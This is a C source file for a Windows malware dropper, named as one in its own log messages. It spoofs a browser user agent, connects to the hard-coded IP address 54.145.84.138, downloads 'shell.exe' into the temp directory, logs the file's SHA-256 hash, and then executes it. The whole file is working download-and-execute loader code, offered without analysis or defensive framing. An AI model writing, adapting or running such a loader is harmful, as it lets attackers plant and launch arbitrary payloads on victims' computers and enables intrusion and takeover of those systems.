#include <windows.h>
#include <wininet.h>
#include <winhttp.h>
#include <wincrypt.h> // For hashing
#include <stdio.h>    // For file operations

// Function to append to the log file
void AppendToLog(const char* message) {
    FILE* logFile;
    fopen_s(&logFile, "dropper_log.txt", "a");  // Open in append mode
    if (logFile) {
        fprintf(logFile, "%s\n", message);
        fclose(logFile);
    }
    else {
        // This will only print to console if there's an issue opening the log file.
        printf("Failed to open log file. Message: %s\n", message);
    }
}

// Function to compute the SHA256 hash of a file
void PrintFileHash(const char* szFileName) {
    AppendToLog("Computing SHA256 hash of the file...");
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HANDLE hFile = NULL;
    BYTE rgbFile[4096];
    DWORD cbRead = 0;
    BYTE rgbHash[32];
    DWORD cbHash = 0;
    CHAR szHash[65];
    DWORD i;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        AppendToLog("Error: CryptAcquireContext failed.");
        return;
    }
    else {
        AppendToLog("CryptAcquireContext succeeded.");
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        AppendToLog("Error: CryptCreateHash failed.");
        return;
    }
    else {
        AppendToLog("CryptCreateHash succeeded.");
    }

    hFile = CreateFile(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (INVALID_HANDLE_VALUE != hFile) {
        AppendToLog("File opened successfully for hashing.");
        while (ReadFile(hFile, rgbFile, sizeof(rgbFile), &cbRead, NULL) && cbRead > 0) {
            CryptHashData(hHash, rgbFile, cbRead, 0);
        }

        CloseHandle(hFile);
    }
    else {
        AppendToLog("Error: Failed to open file for hashing.");
        return;
    }

    cbHash = sizeof(rgbHash);
    if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
        for (i = 0; i < cbHash; i++) {
            sprintf_s(&szHash[i * 2], sizeof(szHash) - i * 2, "%02x", rgbHash[i]);
        }
        char hashLog[512];
        sprintf_s(hashLog, sizeof(hashLog), "SHA-256: %s", szHash);
        AppendToLog(hashLog);
    }
    else {
        AppendToLog("Error: CryptGetHashParam failed.");
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    AppendToLog("File hash computation completed.");
}

int main() {
    WCHAR szFileName[MAX_PATH];
    WCHAR szTempPath[MAX_PATH];
    WCHAR szUserAgent[] = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    // Initialize memory
    AppendToLog("Initializing memory...");
    ZeroMemory(szFileName, sizeof(szFileName));
    ZeroMemory(szTempPath, sizeof(szTempPath));

    // Logging
    AppendToLog("Dropper started...");

    // Get the temp directory and form the full path for the shell.exe
    if (!GetTempPathW(MAX_PATH, szTempPath)) {
        AppendToLog("Error: Failed to get temp path");
        goto cleanup;
    }
    char tempPathLog[512];
    sprintf_s(tempPathLog, sizeof(tempPathLog), "Temp path obtained: %ws", szTempPath);
    AppendToLog(tempPathLog);

    swprintf_s(szFileName, MAX_PATH, L"%sshell.exe", szTempPath);
    char fullPathLog[512];
    sprintf_s(fullPathLog, sizeof(fullPathLog), "Full path for shell.exe: %ws", szFileName);
    AppendToLog(fullPathLog);

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(szUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        AppendToLog("Error: WinHttpOpen failed.");
        goto cleanup;
    }
    else {
        AppendToLog("WinHttpOpen succeeded.");
    }

    AppendToLog("Session handle obtained...");

    // Specify an HTTP server.
    hConnect = WinHttpConnect(hSession, L"54.145.84.138", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        AppendToLog("Error: WinHttpConnect failed.");
        goto cleanup;
    }
    else {
        AppendToLog("WinHttpConnect succeeded.");
    }

    AppendToLog("Connected to HTTP server...");

    // Create an HTTP request handle.
    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/shell.exe", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        AppendToLog("Error: WinHttpOpenRequest failed.");
        goto cleanup;
    }
    else {
        AppendToLog("WinHttpOpenRequest succeeded.");
    }

    AppendToLog("Request handle obtained...");

    // Send a request.
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        AppendToLog("Error: WinHttpSendRequest failed.");
        char errorLog[256];
        sprintf_s(errorLog, sizeof(errorLog), "LastError: %d", GetLastError());
        AppendToLog(errorLog);
        goto cleanup;
    }
    else {
        AppendToLog("WinHttpSendRequest succeeded.");
    }

    // Wait for the response.
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        AppendToLog("Error: WinHttpReceiveResponse failed.");
        char errorLog[256];
        sprintf_s(errorLog, sizeof(errorLog), "LastError: %d", GetLastError());
        AppendToLog(errorLog);
        goto cleanup;
    }
    else {
        AppendToLog("WinHttpReceiveResponse succeeded.");
    }

    AppendToLog("Response received...");

    // Check the HTTP status code
    DWORD dwStatusCode = 0;
    DWORD dwSizeOfStatusCode = sizeof(dwStatusCode);
    if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSizeOfStatusCode, NULL)) {
        char errorLog[256];
        sprintf_s(errorLog, sizeof(errorLog), "Failed to query status code. LastError: %d", GetLastError());
        AppendToLog(errorLog);
    }
    else {
        char statusCodeLog[256];
        sprintf_s(statusCodeLog, sizeof(statusCodeLog), "HTTP Status Code: %d", dwStatusCode);
        AppendToLog(statusCodeLog);
    }

    // Open the file to write the downloaded content.
    hFile = CreateFileW(szFileName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char errorLog[256];
        sprintf_s(errorLog, sizeof(errorLog), "Error: CreateFile failed. LastError: %d", GetLastError());
        AppendToLog(errorLog);
        goto cleanup;
    }
    else {
        AppendToLog("File opened successfully for writing.");
    }

    // Keep checking for data until there is nothing left.
    do {
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            char logMessage[256];
            sprintf_s(logMessage, sizeof(logMessage), "Error querying data availability. Bytes attempted: %d", dwSize);
            AppendToLog(logMessage);
            char errorLog[256];
            sprintf_s(errorLog, sizeof(errorLog), "LastError: %d", GetLastError());
            AppendToLog(errorLog);
            goto cleanup;
        }

        char sizeLog[256];
        sprintf_s(sizeLog, sizeof(sizeLog), "Attempting to read %d bytes of data.", dwSize);
        AppendToLog(sizeLog);

        char* lpBuffer = (char*)malloc(dwSize); // Dynamically allocate buffer size

        if (dwSize == 0) {
            AppendToLog("No more data available from server.");
            free(lpBuffer);
            break;  // Exit the loop if there's no more data
        }

        AppendToLog("Data available...");

        // Read the data.
        if (!WinHttpReadData(hRequest, (LPVOID)lpBuffer, dwSize, &dwDownloaded)) {
            char errorLog[256];
            sprintf_s(errorLog, sizeof(errorLog), "Error: WinHttpReadData failed. Bytes attempted: %d", dwSize);
            AppendToLog(errorLog);
            free(lpBuffer);
            goto cleanup;
        }
        else {
            char logMessage[256];
            sprintf_s(logMessage, sizeof(logMessage), "Data read from server: %d bytes", dwDownloaded);
            AppendToLog(logMessage);
        }

        DWORD dwWritten;
        if (!WriteFile(hFile, lpBuffer, dwDownloaded, &dwWritten, NULL)) {
            char errorLog[256];
            sprintf_s(errorLog, sizeof(errorLog), "Error writing to file. Bytes attempted: %d", dwDownloaded);
            AppendToLog(errorLog);
            free(lpBuffer);
            goto cleanup;
        }
        else {
            char logMessage[256];
            sprintf_s(logMessage, sizeof(logMessage), "Data written to file: %d bytes", dwWritten);
            AppendToLog(logMessage);
        }

        free(lpBuffer);  // Free the dynamically allocated buffer after it's used

    } while (dwSize > 0);

    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;
    AppendToLog("File closed after writing.");

    PrintFileHash(szFileName);

    // Wait for Execution
    Sleep(5000);  // Wait for 5 seconds
    AppendToLog("Waited for 5 seconds.");

    // Execute the binary using CreateProcess with the temp directory as the working directory
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    if (!CreateProcessW(szFileName, NULL, NULL, NULL, FALSE, 0, NULL, szTempPath, &si, &pi)) {
        AppendToLog("Error: CreateProcess failed.");
        goto cleanup;
    }
    else {
        AppendToLog("Binary executed successfully.");
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    AppendToLog("Dropper finished...");

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
        AppendToLog("File handle closed in cleanup.");
    }
    if (hRequest) {
        WinHttpCloseHandle(hRequest);
        AppendToLog("HTTP request handle closed.");
    }
    if (hConnect) {
        WinHttpCloseHandle(hConnect);
        AppendToLog("HTTP connection handle closed.");
    }
    if (hSession) {
        WinHttpCloseHandle(hSession);
        AppendToLog("HTTP session handle closed.");
    }

    return 0;
}
